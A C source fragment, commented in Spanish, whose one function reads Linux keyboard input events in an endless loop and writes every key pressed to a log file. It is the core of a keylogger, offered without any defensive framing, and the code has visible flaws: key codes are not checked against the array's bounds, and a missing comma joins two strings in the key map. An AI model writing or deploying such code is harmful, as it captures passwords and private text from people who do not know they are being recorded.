#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>

// En esta rutina procesamos los eventos correspondientes
// a presionar una tecla, averiguar que tecla es y registrarla
// en el archivo.
// Se usa un mapa de las descripciones de las teclas segun el orden
// en que estan definidas en linux/input.h.
void process_kbd_events(int kbd, int log)
{
  char *km[] = {"", "", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
		"<b>", "\t", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
		"\n", "<LC>", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "\"", "`",
		"<LS>", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<RS>", "*",
		"<LA>", " ",  "", "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>",
		"<F9>", "<F10>", "", "", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".",
	        "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
	        "", "", "", "", "", "", "", "", "", "", "", "", "", ""
		"", "", "", "", "", "", "", "", "", "", ""
                };
  struct input_event *e=malloc(sizeof(struct input_event));

  // El proceso se queda todo el tiempo que sea posible
  for (;;)
    if (read(kbd, e, sizeof(struct input_event)) == sizeof(struct input_event)) {
      if (e->type == EV_KEY && e->value == 1) { // Se presiono una tecla
	if (strlen(km[e->code]) > 0) { // Si definimos codigo para esta tecla, se guarda.
	  write (log, km[e->code], strlen(km[e->code]));
	}
      }
    }
}
